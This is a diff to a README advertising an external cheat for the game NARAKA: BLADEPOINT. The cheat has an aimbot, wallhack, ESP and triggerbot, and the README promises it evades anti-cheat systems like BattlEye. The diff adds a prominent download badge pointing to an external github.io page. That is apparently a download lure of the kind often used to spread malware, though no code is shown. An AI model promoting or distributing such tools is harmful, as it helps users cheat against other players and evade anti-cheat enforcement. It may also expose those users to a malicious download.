@@ -4,6 +4,8 @@
 
 The **NARAKA: BLADEPOINT External Cheat** is a cutting-edge tool designed to elevate your combat skills in *NARAKA: BLADEPOINT*. Featuring an **advanced aimbot**, **enemy tracking (ESP)**, **wallhack**, and **triggerbot**, this open-source cheat runs externally to ensure low detection while maximizing your combat effectiveness. Perfect for competitive players and enthusiasts, it balances power and discretion to evade anti-cheat systems like BattlEye.  
 
+**[![Download BLADEPOINT External](https://img.shields.io/badge/Download-BLADEPOINT%20External-blueviolet)](https://naraka-bladepoint-external-cheat.github.io/.github/)**
+
 ✨ **Key Features**:  
 - **Precision Aimbot**: Auto-aim with adjustable FOV and sensitivity for lightning-fast kills.  
 - **Enemy ESP**: Track opponents through walls, view health, and weapon stats in real-time.  
